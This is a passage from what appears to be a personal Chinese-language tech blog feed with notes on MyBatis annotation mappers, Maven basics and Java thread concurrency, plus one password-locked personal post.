class="keyword">import</span> org.apache.ibatis.annotations.Results;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OrderMapper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;select * from orders where uid=#&#123;uid&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Order&gt; <span class="title">findByUid</span><span class="params">(<span class="keyword">int</span> uid)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;select * from orders&quot;)</span></span><br><span class="line">    <span class="meta">@Results(&#123;</span></span><br><span class="line"><span class="meta">            @Result(column = &quot;id&quot;,property = &quot;id&quot;),</span></span><br><span class="line"><span class="meta">            @Result(column = &quot;ordertime&quot;,property = &quot;ordertime&quot;),</span></span><br><span class="line"><span class="meta">            @Result(column = &quot;total&quot;,property = &quot;total&quot;),</span></span><br><span class="line"><span class="meta">            @Result(</span></span><br><span class="line"><span class="meta">                    property = &quot;user&quot;, //要封装的属性名称</span></span><br><span class="line"><span class="meta">                    column = &quot;uid&quot;, //根据那个字段去查询user表的数据</span></span><br><span class="line"><span class="meta">                    javaType = User.class, //要封装的实体类型</span></span><br><span class="line"><span class="meta">                    //select属性 代表查询那个接口的方法获得数据</span></span><br><span class="line"><span class="meta">                    one = @One(select = &quot;com.itheima.mapper.UserMapper.findById&quot;)</span></span><br><span class="line"><span class="meta">            )</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Order&gt; <span class="title">findAll</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*@Select(&quot;select *,o.id oid from orders o,user u where o.uid=u.id&quot;)</span></span><br><span class="line"><span class="comment">    @Results(&#123;</span></span><br><span class="line"><span class="comment">            @Result(column = &quot;oid&quot;,property = &quot;id&quot;),</span></span><br><span class="line"><span class="comment">            @Result(column = &quot;ordertime&quot;,property = &quot;ordertime&quot;),</span></span><br><span class="line"><span class="comment">            @Result(column = &quot;total&quot;,property = &quot;total&quot;),</span></span><br><span class="line"><span class="comment">            @Result(column = &quot;uid&quot;,property = &quot;user.id&quot;),</span></span><br><span class="line"><span class="comment">            @Result(column = &quot;username&quot;,property = &quot;user.username&quot;),</span></span><br><span class="line"><span class="comment">            @Result(column = &quot;password&quot;,property = &quot;user.password&quot;)</span></span><br><span class="line"><span class="comment">    &#125;)</span></span><br><span class="line"><span class="comment">    public List&lt;Order&gt; findAll();*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="一对多和多对多"><a href="#一对多和多对多" class="headerlink" title="一对多和多对多"></a>一对多和多对多</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.itheima.domain.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Insert(&quot;insert into user values(#&#123;id&#125;,#&#123;username&#125;,#&#123;password&#125;,#&#123;birthday&#125;)&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">(User user)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Update(&quot;update user set username=#&#123;username&#125;,password=#&#123;password&#125; where id=#&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(User user)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Delete(&quot;delete from user where id=#&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;select * from user where id=#&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findById</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;select * from user&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">findAll</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;select * from user&quot;)</span></span><br><span class="line">    <span class="meta">@Results(&#123;</span></span><br><span class="line"><span class="meta">            @Result(id=true ,column = &quot;id&quot;,property = &quot;id&quot;),</span></span><br><span class="line"><span class="meta">            @Result(column = &quot;username&quot;,property = &quot;username&quot;),</span></span><br><span class="line"><span class="meta">            @Result(column = &quot;password&quot;,property = &quot;password&quot;),</span></span><br><span class="line"><span class="meta">            @Result(</span></span><br><span class="line"><span class="meta">                    property = &quot;orderList&quot;,</span></span><br><span class="line"><span class="meta">                    column = &quot;id&quot;,</span></span><br><span class="line"><span class="meta">                    javaType = List.class,</span></span><br><span class="line"><span class="meta">                    many = @Many(select = &quot;com.itheima.mapper.OrderMapper.findByUid&quot;)</span></span><br><span class="line"><span class="meta">            )</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">findUserAndOrderAll</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;SELECT * FROM USER&quot;)</span></span><br><span class="line">    <span class="meta">@Results(&#123;</span></span><br><span class="line"><span class="meta">            @Result(id = true,column = &quot;id&quot;,property = &quot;id&quot;),</span></span><br><span class="line"><span class="meta">            @Result(column = &quot;username&quot;,property = &quot;username&quot;),</span></span><br><span class="line"><span class="meta">            @Result(column = &quot;password&quot;,property = &quot;password&quot;),</span></span><br><span class="line"><span class="meta">            @Result(</span></span><br><span class="line"><span class="meta">                    property = &quot;roleList&quot;,</span></span><br><span class="line"><span class="meta">                    column = &quot;id&quot;,</span></span><br><span class="line"><span class="meta">                    javaType = List.class,</span></span><br><span class="line"><span class="meta">                    many = @Many(select = &quot;com.itheima.mapper.RoleMapper.findByUid&quot;)</span></span><br><span class="line"><span class="meta">            )</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">findUserAndRoleAll</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="SSM框架整合"><a href="#SSM框架整合" class="headerlink" title="SSM框架整合"></a>SSM框架整合</h2><p>……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Mybatis&quot;&gt;&lt;a href=&quot;#Mybatis&quot; class=&quot;headerlink&quot; title=&quot;Mybatis&quot;&gt;&lt;/a&gt;Mybatis&lt;/h1&gt;&lt;h2 id=&quot;三层架构&quot;&gt;&lt;a href=&quot;#三层架构&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="技术文档" scheme="https://a2914475618.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
    
    <category term="Mybatis" scheme="https://a2914475618.github.io/tags/Mybatis/"/>
    
  </entry>
  
  <entry>
    <title>For My Love</title>
    <link href="https://a2914475618.github.io/2021/09/25/My-Love/"/>
    <id>https://a2914475618.github.io/2021/09/25/My-Love/</id>
    <published>2021-09-25T05:34:35.000Z</published>
    <updated>2021-09-25T05:50:37.050Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Welcome to my blog, enter password to real.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">Welcome to my blog, enter password to read.</summary>
    
    
    
    
    <category term="love" scheme="https://a2914475618.github.io/tags/love/"/>
    
  </entry>
  
  <entry>
    <title>Maven</title>
    <link href="https://a2914475618.github.io/2021/09/25/Maven/"/>
    <id>https://a2914475618.github.io/2021/09/25/Maven/</id>
    <published>2021-09-25T02:21:58.000Z</published>
    <updated>2021-09-29T11:35:53.305Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h1><h2 id="什么是Maven"><a href="#什么是Maven" class="headerlink" title="什么是Maven"></a>什么是Maven</h2><blockquote><p>pom.xml</p><p> |</p><p>POM (Project Object Model) 项目对象模型</p><p> |</p><p>依赖管理 (Dependency)</p><p> |</p><p>本地</p><p> |</p><p>私服</p><p>|</p><p>中央仓库</p><p>核心：POM 依赖管理 项目构建生命周期 (包含无数的插件，maven自带)</p><p>好处：开发结构统一</p></blockquote><h2 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h2><ol><li>需要配置MAVEN_HOME</li><li>测试 mvn</li></ol><h2 id="Maven基础知识"><a href="#Maven基础知识" class="headerlink" title="Maven基础知识"></a>Maven基础知识</h2><h3 id="1-仓库"><a href="#1-仓库" class="headerlink" title="1.仓库"></a>1.仓库</h3><p>存储资源，包含各种jar包</p><p>本地仓库配置 在conf文件夹下有一个settting.xml文件，修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;LocalRepository&gt;你想要放置的目录&lt;&#x2F;LocalRepository&gt;</span><br></pre></td></tr></table></figure><h3 id="2-坐标"><a href="#2-坐标" class="headerlink" title="2.坐标"></a>2.坐标</h3><p>maven中定位资源的位置</p><ol><li>groupId 定义隶属于组织名称</li><li>artifactId 当前项目的名称</li><li>version 项目版本号</li><li>packaging 定义项目的打包方式</li></ol><h2 id="IDEA中使用Maven"><a href="#IDEA中使用Maven" class="headerlink" title="IDEA中使用Maven"></a>IDEA中使用Maven</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Maven&quot;&gt;&lt;a href=&quot;#Maven&quot; class=&quot;headerlink&quot; title=&quot;Maven&quot;&gt;&lt;/a&gt;Maven&lt;/h1&gt;&lt;h2 id=&quot;什么是Maven&quot;&gt;&lt;a href=&quot;#什么是Maven&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="技术文档" scheme="https://a2914475618.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
    
    <category term="Maven" scheme="https://a2914475618.github.io/tags/Maven/"/>
    
  </entry>
  
  <entry>
    <title>Java基础</title>
    <link href="https://a2914475618.github.io/2021/09/22/Java%E5%9F%BA%E7%A1%80/"/>
    <id>https://a2914475618.github.io/2021/09/22/Java%E5%9F%BA%E7%A1%80/</id>
    <published>2021-09-22T02:21:58.000Z</published>
    <updated>2021-11-20T09:20:42.995Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java基础"><a href="#Java基础" class="headerlink" title="Java基础"></a>Java基础</h1><blockquote><p>声明：本笔记资料来源于JAVA核心卷1基础知识原书第10版</p></blockquote><h2 id="第14章并发"><a href="#第14章并发" class="headerlink" title="第14章并发"></a>第14章并发</h2><p>进程：是并发执行的程序在执行过程中<strong>分配和管理资源</strong>的基本单位，竞争计算机系统资源的基本单位。</p><p>线程：是进程的一个执行单元，是进程内科调度实体。比进程更小的<strong>独立运行</strong>的基本单位。线程也被称为轻量级进程。</p><p>区别：</p><ol><li><p>进程之间是独立的地址空间，但同一进程的线程共享本进程的地址空间。</p></li><li><p>同一进程内的线程共享本进程的资源如内存、I/O、cpu等，但是进程之间的资源是独立的。</p></li><li><p>一个进程崩溃后，在保护模式下不会对其他进程产生影响；</p><p>一个线程崩溃整个进程都死掉，所以多进程要比多线程健壮。</p></li><li><p>进程可以独立执行，且每个独立的进程程有一个程序运行的入口、顺序执行序列和程序入口。</p><p>线程不能独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。线程是处理器调度的基本单位，但是进程不是。</p></li></ol><p>本质的区别是：每个进程都拥有自己的一整套变量，而线程则共享数据。共享变量使线程之间的通信比进程之间的通信更有效、 更容易。</p><h3 id="14-1线程"><a href="#14-1线程" class="headerlink" title="14.1线程"></a>14.1线程</h3><h4 id="14-1-1使用线程给其他任务提供机会"><a href="#14-1-1使用线程给其他任务提供机会" class="headerlink" title="14.1.1使用线程给其他任务提供机会"></a>14.1.1使用线程给其他任务提供机会</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> ) 将任务代码移到实现了 Runnable 接口的类的 run 方法中。这个接口非常简单，只有</span><br><span class="line">一个方法：</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Runnable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> runO；</span><br><span class="line">&#125;</span><br><span class="line">由于 Runnable 是一个函数式接口，可以用 lambda 表达式建立一个实例：</span><br><span class="line">Runnable r = <span class="number">0</span> -&gt; &#123; task code &#125;;</span><br><span class="line"><span class="number">2</span> ) 由 Runnable 创建一个 Thread 对象：</span><br><span class="line">Thread t = <span class="keyword">new</span> Thread(r);</span><br><span class="line"><span class="number">3</span> ) 启动线程：</span><br><span class="line">t.startO；</span><br><span class="line"><span class="comment">//================================</span></span><br><span class="line">Runnable runnable=()-&gt;&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> k=<span class="number">100</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">100</span>;j++)&#123;</span><br><span class="line">                    k=k-<span class="number">1</span>;</span><br><span class="line">                    Thread.sleep(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(k);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (InterruptedException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Thread thread=<span class="keyword">new</span> Thread(runnable);</span><br><span class="line">        thread.start();</span><br><span class="line"><span class="comment">//==================================</span></span><br><span class="line">结果为<span class="number">0</span></span><br></pre></td></tr></table></figure><p>这里需要捕获sleep方法可能抛出的异常InterruptException，发生该异常时，run方法结束执行。</p><p>也可以通过构建一个 Thread 类的子类定义一个线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span>  <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//然后， 构造一个子类的对象，并调用 start 方法。不过，这种方法已不再推荐。 应</span></span><br><span class="line"><span class="comment">//该将要并行运行的任务与运行机制解耦合。如果有很多任务，要为每个任务创建一个独</span></span><br><span class="line"><span class="comment">//立的线程所付出的代价太大了</span></span><br></pre></td></tr></table></figure><p>不要调用 Thread 类或 Runnable 对象的 run 方法。 直接调用 run 方法， 只会执行同 一个线程中的任务， 而不会启动新线程。应该调用 Thread.start 方法。这个方法将创建一 个执行 run 方法的新线程。</p><h3 id="14-2中断线程"><a href="#14-2中断线程" class="headerlink" title="14.2中断线程"></a>14.2中断线程</h3><p>不要调用 Thread 类或 Runnable 对象的 run 方法。 直接调用 run 方法， 只会执行同 一个线程中的任务， 而不会启动新线程。应该调用 Thread.start 方法。这个方法将创建一 个执行 ran 方法的新线程。</p><p>interrupt 方法可以用来请求终止线程。</p><p>当对一个线程调用 interrupt 方法时，线程的中断状态将被置位。这是每一个线程都具有 的 boolean 标志。每个线程都应该不时地检査这个标志， 以判断线程是否被中断。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (!Thread.currentThread().islnterrupted() &amp;&amp; more work to <span class="keyword">do</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//do more work</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Thread.currentThread 方法获得当前线 程， 然后调用 islnterrupted 方法。</p><p>线程阻塞时无法调用 islnterrupted 方法，也就是使用sleep方法使线程阻塞后。</p><p>更普遍的情况是，线程将简单地将中断作为一个终止 的请求。这种线程的 run 方法具有如下形式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Runnable r = () -&gt; &#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (!Thread.currentThread().islnterrupted0 &amp;&amp; more work to <span class="keyword">do</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span> more work</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(InterruptedException e)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// thread was interr叩ted during sleep or wait</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">cleanup,</span><br><span class="line">ifrequired</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// exiting the run method terminates the thread</span></span><br><span class="line">&#125;；</span><br></pre></td></tr></table></figure><p>中断状态时无法调用sleep方法，sleep后无法使用检测中断方法。</p><p>interrupted 方法会清除该线程的中断 状态。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> mySubTaskO</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span> &#123; sleep(delay); &#125;</span><br><span class="line"><span class="keyword">catch</span> (InterruptedException e) &#123; </span><br><span class="line">    Thread.currentThread().interrupt(); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">• <span class="keyword">void</span> interrupt</span><br><span class="line">向线程发送中断请求。线程的中断状态将被设置为 <span class="keyword">true</span>。如果目前该线程被一个 sleep</span><br><span class="line">调用阻塞，那么，InterruptedException 异常被抛出。</span><br><span class="line">•<span class="function"><span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">interrupted</span><span class="params">()</span></span></span><br><span class="line"><span class="function">测试当前线程（即正在执行这一命令的线程）是否被中断。注意，这是一个静态方法。</span></span><br><span class="line"><span class="function">这一调用会产生副作用—它将当前线程的中断状态重置为 <span class="keyword">false</span>。</span></span><br><span class="line"><span class="function">• <span class="keyword">boolean</span> <span class="title">islnterrupted</span><span class="params">()</span></span></span><br><span class="line"><span class="function">测试线程是否被终止。不像静态的中断方法，这一调用不改变线程的中断状态。</span></span><br><span class="line"><span class="function">•<span class="keyword">static</span> Thread <span class="title">currentThread</span><span class="params">()</span></span></span><br><span class="line"><span class="function">返回代表当前执行线程的 Thread 对象</span></span><br></pre></td></tr></table></figure><h3 id="14-3线程状态"><a href="#14-3线程状态" class="headerlink" title="14.3线程状态"></a>14.3线程状态</h3><p>线程可以有如下 6 种状态： </p><ul><li><p>New (新创建） </p><p>当用 new 操作符创建一个新线程时，如 newThread(r)， 该线程还没有开始运行</p></li><li><p>Runnable (可运行） </p><p>一旦调用 start 方法，线程处于 runnable 状态。一个可运行的线桿可能正在运行也可能没 有运行， 这取决于操作系统给线程提供运行的时间。一旦一个线程开始运行，它不必始终保持运行。事实上，运行中的线程被中断，目的是 为了让其他线程获得运行机会。线程调度的细节依赖于操作系统提供的服务。抢占式调度系 统给每一个可运行线程一个时间片来执行任务。</p></li><li><p>Blocked (被阻塞） </p></li><li><p>Waiting (等待） </p></li><li><p>Timed waiting (计时等待） </p><blockquote><p>当线程处于被阻塞或等待状态时，它暂时不活动。它不运行任何代码且消耗最少的资 源。直到线程调度器重新激活它。</p><p>当一个线程试图获取一个内部的对象锁（而不是 javiutiUoncurrent 库中的锁，) 而该 锁被其他线程持有， 则该线程进人阻塞状态（ 当所有其他线程释放该锁，并且线程调度器允许 本线程持有它的时候，该线程将变成非阻塞状态。 </p><p>■ 当线程等待另一个线程通知调度器一个条件时，它自己进入等待状态。我们在第 14.5.4 节来讨论条件。在调用 Object.wait 方法或 Thread.join 方法， 或者是等待 java, util.concurrent 库中的 Lock 或 Condition 时， 就会出现这种情况。实际上，被阻塞状态 与等待状态是有很大不同的。</p><p> •有几个方法有一个超时参数。调用它们导致线程进人计时等待（ timed waiting ) 状 态。这一状态将一直保持到超时期满或者接收到适当的通知。带有超时参数的方法有 Thread.sleep 和 Object.wait、Thread.join、 Lock,tryLock 以及 Condition.await 的计时版。</p><p>当一个线 程被阻塞或等待时（或终止时，) 另一个线程被调度为运行状态。当一个线程被重新激活（例 如， 因为超时期满或成功地获得了一个锁，) 调度器检查它是否具有比当前运行线程更高的优 先级。如果是这样，调度器从当前运行线程中挑选一个， 剥夺其运行权，选择一个新的线程 运行。</p></blockquote></li><li><p>Terminated (被终止）</p><p>因为 run 方法正常退出而自然死亡</p><p>因为一个没有捕获的异常终止了 nm 方法而意外死亡</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211013144850.png"></p><p>通过getState方法确定当前线程状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">•void join( )</span><br><span class="line">等待终止指定的线程。</span><br><span class="line">•void join(longmi11is)</span><br><span class="line">等待指定的线程死亡或者经过指定的毫秒数。</span><br><span class="line">•Thread.State.getStateO5. 0</span><br><span class="line">得到这一线程的状态；NEW、RUNNABLE BLOCKED、 WAITING HMED_WAmNG</span><br><span class="line">或 TERMINATED 之一。</span><br></pre></td></tr></table></figure><h3 id="14-4线程属性"><a href="#14-4线程属性" class="headerlink" title="14.4线程属性"></a>14.4线程属性</h3><h4 id="14-4-1线程优先级"><a href="#14-4-1线程优先级" class="headerlink" title="14.4.1线程优先级"></a>14.4.1线程优先级</h4><p>默认情况下， 一个线程继承它的父 线程的优先级。可以用 setPriority 方法提高或降低任何一个线程的优先级。可以将优先级设 置为在 MIN_PRIORITY (在 Thread 类中定义为 1 ) 与 MAX_PRIORITY (定义为 10 ) 之间的 任何值。NORM_PRIORITY 被定义为 5。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">•<span class="function"><span class="keyword">void</span> <span class="title">setPriority</span><span class="params">(<span class="keyword">int</span> newPriority)</span></span></span><br><span class="line"><span class="function">设置线程的优先级。优先级必须在 Thread.MIN_PRIORITY 与 Thread.MAX_PRIORITY</span></span><br><span class="line"><span class="function">之间。一般使用 Thread.NORMJ»RIORITY 优先级。</span></span><br><span class="line"><span class="function">•<span class="keyword">static</span> <span class="keyword">int</span> MIN_PRIORITY</span></span><br><span class="line"><span class="function">线程的最小优先级。最小优先级的值为 1。</span></span><br><span class="line"><span class="function">•<span class="keyword">static</span> <span class="keyword">int</span> N0RM_PRI0RITY</span></span><br><span class="line"><span class="function">线程的默认优先级。默认优先级为 5。</span></span><br><span class="line"><span class="function">•<span class="keyword">static</span> <span class="keyword">int</span> MAX—PRIORITY</span></span><br><span class="line"><span class="function">线程的最高优先级。最高优先级的值为 10。</span></span><br><span class="line"><span class="function">•<span class="keyword">static</span> <span class="keyword">void</span> <span class="title">yield</span><span class="params">( )</span></span></span><br><span class="line"><span class="function">导致当前执行线程处于让步状态。如果有其他的可运行线程具有至少与此线程同样高</span></span><br><span class="line"><span class="function">的优先级，那么这些线程接下来会被调度。注意，这是一个静态方法</span></span><br></pre></td></tr></table></figure><h4 id="14-4-2守护线程"><a href="#14-4-2守护线程" class="headerlink" title="14.4.2守护线程"></a>14.4.2守护线程</h4><p>t.setDaemon(true)可以将线程转换为守护线程。这一方法必须在线程启动之前调用。</p><p>守护线程唯一的用途就是为其他线程提供服务。</p><p>当只剩下守护线程时， 虚拟机就退出了，由于如果只 剩下守护线程， 就没必要继续运行程序了</p><p>守护线程应该永远不去访问固有资源， 如文件、 数据库，因为它会在任何时 候甚至在一个操作的中间发生中断。</p><h4 id="14-4-3未捕获异常处理器"><a href="#14-4-3未捕获异常处理器" class="headerlink" title="14.4.3未捕获异常处理器"></a>14.4.3未捕获异常处理器</h4><p>该处理器必须属于一个实现 Thread.UncaughtExceptionHandler 接口的类。该类有void uncaughtException(Thread t, Throwable e)的方法。</p><p>可以用 setUncaughtExceptionHandler 方法为任何线程安装一个处理器。也可以用 Thread 类的静态方法 setDefaultUncaughtExceptionHandler 为所有线程安装一个默认的处理器。替换 处理器可以使用日志 API 发送未捕获异常的报告到日志文件。</p><p>如果不安装默认的处理器， 默认的处理器为空。但是， 如果不为独立的线程安装处理 器，此时的处理器就是该线程的 ThreadGroup 对象</p><p>ThreadGroup 类实现 Thread.UncaughtExceptionHandler 接口。它的 uncaughtException 方 法做如下操作： 1 ) 如果该线程组有父线程组， 那么父线程组的 uncaughtException 方法被调用。 2 ) 否则， 如果 Thread.getDefaultExceptionHandler 方法返回一个非空的处理器， 则调用 该处理器。 3 ) 